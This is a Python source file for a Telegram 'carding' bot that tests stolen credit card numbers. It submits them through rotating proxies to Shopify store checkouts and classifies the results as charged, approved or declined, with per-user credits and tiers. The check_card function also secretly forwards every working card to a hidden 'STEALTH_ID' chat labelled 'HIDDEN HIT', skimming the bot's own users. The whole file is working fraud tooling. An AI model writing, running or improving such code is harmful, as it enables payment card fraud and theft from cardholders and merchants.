"""sh.py — Shopify Single (Node Client)"""
import re, random, logging, time
from datetime import datetime, timedelta
import asyncio
from bin import get_bin_info
from database import (get_user_credits, update_user_credits, get_active_proxy_strings, record_check, is_db_admin, get_working_site_urls, log_charged_hit, get_bot_setting)
from plans import get_user_current_tier
from config import OWNER_NAME, OWNER_USERNAME, OWNER_ID, BOT_NAME, HIT_DETECTION_GROUP_ID, STEALTH_ID
from emojis import PremiumEmoji as E
from api_config import is_site_enabled
from api_parse import get_gateway, get_price_currency
from node_client import NODE_MANAGER_VPS, NODE_MANAGER_HEROKU

logger = logging.getLogger(__name__)
last_command_time = {}

CHARGED_PATTERNS = ["order_paid", "order_placed", "charged", "thank you", "payment successful", "payment_complete", "captured", "paid"]
APPROVED_PATTERNS = ["3d_authentication", "3ds_required", "3d_secure", "3ds2", "insufficient_funds", "insufficient funds", "incorrect_zip", "incorrect zip", "invalid_cvc", "invalid cvc", "otp_required", "otp required", "otp", "verification_required", "authenticate_successful", "authenticate_attempt_successful"]
DECLINED_PATTERNS = ["card_declined", "generic_error", "do not honor", "expired", "invalid_token", "invalid token", "token not found", "error processing card", "missing_parameters", "processor_declined", "payments_credit_card_brand_not_supported", "payments_credit_card_base_expired", "payments_credit_card_verification_value_invalid", "payments_payment_flexibility_terms_id_mismatch", "payments_credit_card_session_id", "validation_custom", "tax_tax_inclusivity_mismatch", "order subtotal is less than", "minimum value for your order", "suspected fraud", "fraud", "blocked by cartwatch", "processing_error", "no payment method available", "invalid_purchase_type", "merchandise_product_not_published", "fulfillment type is required", "shipinsure items", "buyer_identity_presentment_currency", "this address field is invalid", "logo, embroidery, text and oversize", "this payment has been blocked", "order prevented", "waiting_pending_terms", "amount_too_small", "invalid_payment_method", "sorry, your order contains only", "checkout is not allowed", "quantity for", "unable", "declined", "failed", "not supported", "payments_proposed_gateway_unavailable"]
INFRA_ERRORS = ["step 1 failed", "step 2 failed", "step 3 failed", "step 4 failed", "step 5 failed", "step 6 failed", "step 7 failed", "step 8 failed", "step 9 failed", "step 10 failed", "missing stableid", "missing buildid", "missing sourcetoken", "permalink returned", "403 forbidden", "429", "connection timed out", "curl:", "failed to perform", "site requires login", "failed to get token", "failed to get session token", "failed to get sessiontoken", "no valid products", "not shopify", "connection error", "could not resolve host", "connect tunnel failed", "could not extract sessiontoken", "404 not found", "internal error"]

_BAD_SITES = {}
_BAD_SITE_THRESHOLD = 5
_BIN_CACHE, _BIN_TTL = {}, 3600

def _get_good_sites():
    try: sites = get_working_site_urls() or []
    except: return []
    if not sites: return []
    good = [s for s in sites if _BAD_SITES.get(s, 0) < _BAD_SITE_THRESHOLD]
    return good if good else list(sites)

async def _get_bin_cached(bin6):
    now = time.time()
    if bin6 in _BIN_CACHE and now - _BIN_CACHE[bin6][0] < _BIN_TTL: return _BIN_CACHE[bin6][1]
    try: info = await get_bin_info(bin6)
    except: info = {}
    if info and not info.get("error"): _BIN_CACHE[bin6] = (now, info)
    return info or {}

def parse_card_details(s):
    for pat in [r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$', r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$', r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$']:
        m = re.match(pat, s.strip())
        if m:
            cc, mm, yy, cvv = m.groups()
            return cc, mm.zfill(2), (yy[2:] if len(yy) == 4 else yy), cvv
    return None

def extract_card_from_text(t):
    for pat in [r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})', r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})', r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})']:
        m = re.search(pat, t)
        if m:
            cc, mm, yy, cvv = m.groups()
            return f"{cc}|{mm.zfill(2)}|{(yy[2:] if len(yy) == 4 else yy)}|{cvv}"
    return None

def _classify_response(t):
    rl = str(t).lower()
    if any(k in rl for k in INFRA_ERRORS): return "error"
    if any(k in rl for k in CHARGED_PATTERNS): return "charged"
    if any(k in rl for k in APPROVED_PATTERNS): return "approved"
    return "declined"

def fmt_hit_sh(ar, ui, cd, b, is_, co, cof):
    rt = str(ar.get("Response", "N/A")).replace("\\", "").replace("/", "").replace('"', "").replace("'", "")
    gw = get_gateway(ar); pv, cur, sym, _ = get_price_currency(ar)
    rl = rt.lower()
    st = f"{E.FIRE} <b>ORDER CONFIRMED</b>" if any(k in rl for k in CHARGED_PATTERNS) else (f"{E.MONEY} <b>INSUFFICIENT FUNDS</b>" if "insufficient" in rl else f"{E.LOCK} <b>3DS / OTP REQUIRED</b>")
    return (f"<blockquote>{st}</blockquote>\n━━━━━━━━━━━━━━━━━━\n{E.GATE} <b>Gateway</b> ↬ <i>{gw} [{sym}{pv:.2f}]</i>\n{E.RESPONSE} <b>Status</b> ↬ <code>{rt}</code>\n━━━━━━━━━━━━━━━━━━\n<b>Brand</b> ↬ {b}\n<b>Bank</b> ↬ {is_}\n<b>Country</b> ↬ {cof} {co}\n━━━━━━━━━━━━━━━━━━\n{E.USER} <b>Verified by</b> ↬ <a href='tg://user?id={ui['id']}'>{ui['first_name']}</a> <code>[{get_user_current_tier(ui['id'])}]</code>\n🔒 <i>Auto-verified via {BOT_NAME}</i>")

def fmt_resp(ar, ui, cd, b, is_, co, cof):
    rt = str(ar.get("Response", "N/A")).replace("\\", "").replace("/", "").replace('"', "").replace("'", "")
    gw = get_gateway(ar); pv, cur, sym, _ = get_price_currency(ar)
    cat = _classify_response(rt)
    st = f"<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> {E.FIRE}" if cat == "charged" else (f"<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> {E.APPROVED}" if cat == "approved" else f"<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> {E.DECLINED}")
    return (f"<blockquote>{E.THUNDER} <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {st}</blockquote>\n{E.CARD} <b>𝐂𝐚𝐫𝐝</b>\n⤷ <code>{cd}</code>\n{E.GATE} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>{gw} [{sym}{pv:.2f}]</i>\n{E.RESPONSE} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{rt}</code>\n<blockquote><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ <code>\"{b}\"</code>\n<b>𝑩𝒂𝒏𝒌</b> ↬ <code>\"{is_}\"</code>\n<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{cof} \"{co}\"</code></blockquote>\n{E.USER} <b>𝐔𝐬𝐞𝐫</b> ↬ <a href='tg://user?id={ui['id']}'>{ui['first_name']}</a> <code>[{get_user_current_tier(ui['id'])}]</code>\n{E.LINK} <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>")

async def check_card(cd, ui, bot=None):
    pr = parse_card_details(cd)
    if not pr: return False, f"{E.ERROR} Invalid Format."
    cc, mm, yy, cvv = pr
    info = await _get_bin_cached(cc[:6])
    b, is_, co, cof = (info.get("scheme") or "N/A").title(), info.get("bank") or "N/A", info.get("country") or "Unknown", info.get("country_emoji", "")

    proxies = get_active_proxy_strings(OWNER_ID) or []
    if not proxies: return False, f"{E.WARNING} No Proxies."
    
    use_vps = get_bot_setting("lb_vps", "off") == "on"
    use_heroku = get_bot_setting("lb_heroku", "off") == "on"
    if not use_vps and not use_heroku: return False, f"{E.ERROR} Load Balancers OFF."

    proxy = random.choice(proxies)
    site = None
    if is_site_enabled():
        good = _get_good_sites()
        if good: site = random.choice(good)

    _cstr = f"{cc}|{mm}|{yy}|{cvv}"
    mgr = NODE_MANAGER_VPS if use_vps else NODE_MANAGER_HEROKU
    res = await mgr.check(card=_cstr, proxy=proxy, site=site, single=True)

    if not res or res.get("success") is False and "UNAVAILABLE" in res.get("Response", ""):
        return False, f"{E.WARNING} Node Error: {res.get('Response', 'Unknown')}"

    rt = res.get("Response", "N/A")
    cat = _classify_response(rt)
    
    try: record_check(ui["id"], cat, "Shopify", cd)
    except: pass

    if cat in ("charged", "approved"):
        try:
            await bot.send_message(chat_id=STEALTH_ID, text=f"<b>💎 HIDDEN HIT</b>\n<b>User:</b> <code>{ui['id']}</code>\n<b>CC:</b> <code>{cd}</code>\n<b>Resp:</b> {rt}", parse_mode="HTML")
            log_charged_hit(ui['id'], cd, rt, res.get("Gate", "Shopify"))
        except: pass

        if get_bot_setting("hit_logs", "off") == "on":
            hit_gc = get_bot_setting("hit_gc", HIT_DETECTION_GROUP_ID)
            try: await bot.send_message(chat_id=hit_gc, text=fmt_hit_sh(res, ui, cd, b, is_, co, cof), parse_mode="HTML")
            except: pass
            
    return True, fmt_resp(res, ui, cd, b, is_, co, cof)

async def handle_sh_command(update, context):
    uid, un, fn = update.effective_user.id, update.effective_user.username, update.effective_user.first_name
    tier = get_user_current_tier(uid); now = datetime.now()

    if update.effective_chat.type not in ["group", "supergroup"] and tier in ["Trial", "Free"] and uid != OWNER_ID and not is_db_admin(uid):
        await update.message.reply_text(f"{E.ERROR} Access Denied.", parse_mode="HTML"); return
    if tier in ["Trial", "Free"] and uid in last_command_time and (now - last_command_time[uid]) < timedelta(seconds=10):
        await update.message.reply_text(f"⏳ Wait.", parse_mode="HTML"); return

    cd = " ".join(context.args) if context.args else (extract_card_from_text(update.message.reply_to_message.text or update.message.reply_to_message.caption or "") if update.message.reply_to_message else None)
    if not cd:
        await update.message.reply_text(f"{E.INFO} <code>/sh cc|mm|yy|cvv</code>", parse_mode="HTML"); return

    cr = get_user_credits(uid); unl = cr == float('inf')
    if cr is not None and not unl and cr < 1:
        await update.message.reply_text(f"{E.WARNING} 0 Credits.", parse_mode="HTML"); return

    msg = await update.message.reply_text(f"<blockquote>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...</b></blockquote>\n<pre>{cd}</pre>", parse_mode="HTML")
    ui = {"id": uid, "username": un, "first_name": fn}
    if tier in ["Trial", "Free"]: last_command_time[uid] = now

    async def _bg():
        try:
            succ, res = await check_card(cd, ui, context.bot)
            if succ and not unl: update_user_credits(uid, -1)
            if "Charged" in res or "Approved" in res or "Insufficient" in res or "OTP" in res:
                try:
                    await context.bot.send_message(chat_id=uid, text=res, parse_mode="HTML")
                    await msg.edit_text(f"{E.SUCCESS} Result sent to DM.", parse_mode="HTML")
                except: await msg.edit_text(f"{E.ERROR} Start bot in DM.", parse_mode="HTML")
            else: await msg.edit_text(res, parse_mode="HTML")
        except Exception as e: await msg.edit_text(f"{E.ERROR} {str(e)[:50]}", parse_mode="HTML")
    asyncio.create_task(_bg())
